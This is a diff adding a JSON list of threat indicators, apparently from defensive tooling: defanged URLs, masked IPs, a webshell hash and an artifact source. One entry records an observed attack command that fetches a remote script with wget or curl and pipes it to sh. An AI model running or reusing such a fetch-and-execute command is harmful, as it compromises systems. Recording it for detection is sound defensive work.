@@ -1,0 +1,45 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217[.]60[.]195[.]XXX/sh)"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217[.]60[.]195[.]XXX/sh"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190[.]179[.]139.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "217[.]60[.]195.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "(wget --no-check-certificate -qO- hxxps://217[.]60[.]195[.]XXX/sh || curl -sk hxxps://217[.]60[.]195[.]XXX/sh) | sh -s apache.selfre"
+  },
+  {
+    "context": "Inbound payload hash (webshell)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "0c0c4043c84b0ca35f66fa7a69ac1a880a03485e18fe872d295d5dccc8905ba6"
+  },
+  {
+    "asn": "22927",
+    "country": "Sweden",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "81[.]226[.]129.XXX"
+  }
+]
